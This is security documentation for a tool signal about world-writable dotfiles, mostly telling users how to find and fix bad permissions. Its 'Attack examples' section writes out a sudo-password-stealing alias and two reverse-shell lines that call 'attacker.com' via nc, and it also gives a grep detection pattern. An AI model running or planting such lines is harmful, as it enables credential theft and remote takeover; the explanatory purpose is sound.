# World-Writable Config Files

## What this is

This signal detects configuration files in your home directory that are world-writable (permissions 666 or 777). World-writable files can be modified by any user on the system, allowing attackers to inject malicious configurations, steal credentials, or escalate privileges.

Common affected files:
- Shell configs: `.bashrc`, `.zshrc`, `.profile`
- SSH config: `.ssh/config`, `.ssh/authorized_keys`
- Git config: `.gitconfig`
- AWS credentials: `.aws/credentials`, `.aws/config`
- Other configs: `.npmrc`, `.docker/config.json`

## Why this matters

**Security Risk**:
- **Privilege escalation**: Attackers can modify shell configs to execute malicious code when you log in
- **Credential theft**: Can inject code to steal passwords, API keys, and tokens
- **Backdoor installation**: Can add persistent backdoors to your environment
- **Command hijacking**: Can modify PATH or aliases to hijack commands

**Attack examples**:
```bash
# Attacker modifies your .bashrc
echo 'alias sudo="echo \$PASSWORD | tee /tmp/stolen && sudo"' >> ~/.bashrc
# Now when you use sudo, your password is stolen

# Or modifies SSH config
echo "ProxyCommand nc attacker.com 4444 -e /bin/bash" >> ~/.ssh/config
# Now SSH connections create reverse shells to attacker

# Or modifies .gitconfig
git config --global core.sshCommand "ssh -o ProxyCommand='nc attacker.com 4444 -e /bin/bash'"
# Git operations create backdoors
```

## How to remediate

### Find world-writable config files

**Check common config files**:
```bash
# Check specific files
ls -la ~/.bashrc ~/.zshrc ~/.profile ~/.ssh/config ~/.gitconfig

# Find all world-writable files in home directory
find ~ -type f -perm -002 -ls

# Find world-writable config files
find ~ -name ".*rc" -o -name ".*config" -o -name ".*profile" | xargs ls -la
```

### Fix permissions

**Fix specific files**:
```bash
# Shell configs (should be 644 or 600)
chmod 644 ~/.bashrc
chmod 644 ~/.zshrc
chmod 644 ~/.profile

# SSH files (should be 600)
chmod 600 ~/.ssh/config
chmod 600 ~/.ssh/id_*
chmod 644 ~/.ssh/id_*.pub
chmod 644 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Git config (should be 644)
chmod 644 ~/.gitconfig

# AWS credentials (should be 600)
chmod 600 ~/.aws/credentials
chmod 644 ~/.aws/config

# Docker config (should be 600)
chmod 600 ~/.docker/config.json
```

**Fix all world-writable files**:
```bash
# Remove world-write permission from all files in home
find ~ -type f -perm -002 -exec chmod o-w {} \;

# Verify
find ~ -type f -perm -002
# Should return nothing
```

### Set secure default permissions

**Set umask to prevent world-writable files**:
```bash
# Add to ~/.bashrc or ~/.zshrc
umask 022  # New files will be 644 (not world-writable)

# Or for maximum security
umask 077  # New files will be 600 (only owner can access)

# Reload
source ~/.bashrc
```

**Verify umask**:
```bash
umask
# Should show: 0022 or 0077
```

### Audit and verify config files

**Check for malicious modifications**:
```bash
# Check shell configs for suspicious content
grep -n "alias\|function\|export.*PASSWORD\|nc.*-e\|/bin/bash" ~/.bashrc ~/.zshrc

# Check SSH config for suspicious proxies
grep -n "ProxyCommand" ~/.ssh/config

# Check Git config for suspicious commands
git config --global --list | grep -i "command\|proxy"

# Check for suspicious cron jobs
crontab -l
```

**Compare with known good versions**:
```bash
# If you have backups or version control
diff ~/.bashrc ~/.bashrc.backup

# Or check Git history
cd ~
git log -p .bashrc
```

### Platform-specific fixes

**macOS**:
```bash
# Fix common config files
chmod 644 ~/.bashrc ~/.bash_profile ~/.zshrc ~/.zprofile
chmod 600 ~/.ssh/config ~/.ssh/id_*
chmod 700 ~/.ssh
chmod 644 ~/.gitconfig

# Set umask
echo "umask 022" >> ~/.zshrc
source ~/.zshrc
```

**Linux**:
```bash
# Fix common config files
chmod 644 ~/.bashrc ~/.profile ~/.bash_profile
chmod 600 ~/.ssh/config ~/.ssh/id_*
chmod 700 ~/.ssh
chmod 644 ~/.gitconfig

# Set umask
echo "umask 022" >> ~/.bashrc
source ~/.bashrc
```

**Windows (WSL)**:
```bash
# WSL has different permission model
# Fix permissions in WSL filesystem
chmod 644 ~/.bashrc ~/.profile
chmod 600 ~/.ssh/config ~/.ssh/id_*
chmod 700 ~/.ssh

# Note: Windows filesystem (/mnt/c) has different permissions
```

### Recommended permissions

**Shell configuration files**:
```bash
chmod 644 ~/.bashrc      # -rw-r--r--
chmod 644 ~/.zshrc       # -rw-r--r--
chmod 644 ~/.profile     # -rw-r--r--
chmod 644 ~/.bash_profile # -rw-r--r--
```

**SSH files**:
```bash
chmod 700 ~/.ssh         # drwx------
chmod 600 ~/.ssh/config  # -rw-------
chmod 600 ~/.ssh/id_*    # -rw------- (private keys)
chmod 644 ~/.ssh/id_*.pub # -rw-r--r-- (public keys)
chmod 644 ~/.ssh/authorized_keys # -rw-r--r--
chmod 644 ~/.ssh/known_hosts # -rw-r--r--
```

**Credential files**:
```bash
chmod 600 ~/.aws/credentials # -rw-------
chmod 644 ~/.aws/config      # -rw-r--r--
chmod 600 ~/.npmrc           # -rw-------
chmod 600 ~/.docker/config.json # -rw-------
chmod 600 ~/.netrc           # -rw-------
```

**Other config files**:
```bash
chmod 644 ~/.gitconfig   # -rw-r--r--
chmod 644 ~/.vimrc       # -rw-r--r--
chmod 644 ~/.tmux.conf   # -rw-r--r--
```

### Best practices

1. **Never make config files world-writable**:
   ```bash
   # Bad
   chmod 666 ~/.bashrc  # ✗ World-writable

   # Good
   chmod 644 ~/.bashrc  # ✓ Owner can write, others can read
   chmod 600 ~/.bashrc  # ✓ Only owner can access (most secure)
   ```

2. **Set restrictive umask**:
   ```bash
   # In ~/.bashrc or ~/.zshrc
   umask 022  # Recommended
   # or
   umask 077  # Most secure
   ```

3. **Audit permissions regularly**:
   ```bash
   # Add to weekly checklist
   find ~ -type f -perm -002 -ls

   # Or add to cron
   0 0 * * 0 find ~ -type f -perm -002 -ls | mail -s "World-writable files" you@example.com
   ```

4. **Use version control for configs**:
   ```bash
   # Keep configs in Git (dotfiles repo)
   cd ~
   git init
   git add .bashrc .zshrc .gitconfig
   git commit -m "Initial config"

   # Can track unauthorized changes
   git diff
   ```

5. **Set permissions in shell config**:
   ```bash
   # Add to ~/.bashrc or ~/.zshrc
   # Fix permissions on login
   chmod 644 ~/.bashrc ~/.zshrc 2>/dev/null
   chmod 600 ~/.ssh/config ~/.ssh/id_* 2>/dev/null
   chmod 700 ~/.ssh 2>/dev/null
   ```

6. **Use file integrity monitoring**:
   ```bash
   # Use AIDE, Tripwire, or similar
   sudo aide --init
   sudo aide --check
   ```

7. **Restrict sudo usage**:
   ```bash
   # Don't use sudo to edit files in home directory
   # If file is owned by root, fix ownership first
   sudo chown $USER:$USER ~/.bashrc
   vim ~/.bashrc
   ```

### If config files are compromised

1. **Immediately check for malicious content**:
   ```bash
   cat ~/.bashrc ~/.zshrc ~/.profile
   cat ~/.ssh/config
   git config --global --list
   ```

2. **Restore from backup** or known good version:
   ```bash
   cp ~/.bashrc.backup ~/.bashrc
   # Or
   git checkout ~/.bashrc
   ```

3. **Fix permissions**:
   ```bash
   chmod 644 ~/.bashrc
   ```

4. **Check for persistence mechanisms**:
   ```bash
   crontab -l
   ls -la ~/.config/autostart/
   systemctl --user list-units
   ```

5. **Rotate credentials** that may have been stolen

6. **Investigate** how permissions were changed

7. **Monitor** for suspicious activity

### Automated fix script

**Create a script to fix common issues**:
```bash
#!/bin/bash
# fix-config-permissions.sh

echo "Fixing config file permissions..."

# Shell configs
chmod 644 ~/.bashrc ~/.zshrc ~/.profile ~/.bash_profile 2>/dev/null

# SSH
chmod 700 ~/.ssh 2>/dev/null
chmod 600 ~/.ssh/config ~/.ssh/id_* 2>/dev/null
chmod 644 ~/.ssh/id_*.pub ~/.ssh/authorized_keys ~/.ssh/known_hosts 2>/dev/null

# Credentials
chmod 600 ~/.aws/credentials ~/.npmrc ~/.docker/config.json ~/.netrc 2>/dev/null
chmod 644 ~/.aws/config 2>/dev/null

# Other configs
chmod 644 ~/.gitconfig ~/.vimrc ~/.tmux.conf 2>/dev/null

echo "Done! Permissions fixed."
```

**Make it executable and run**:
```bash
chmod +x fix-config-permissions.sh
./fix-config-permissions.sh
```


## Disabling This Signal

To disable this signal, set the environment variable:
```
export DASHLIGHTS_DISABLE_WORLD_WRITABLE_CONFIG=1
```

To disable permanently, add the above line to your shell configuration file (`~/.zshrc`, `~/.bashrc`, etc.).
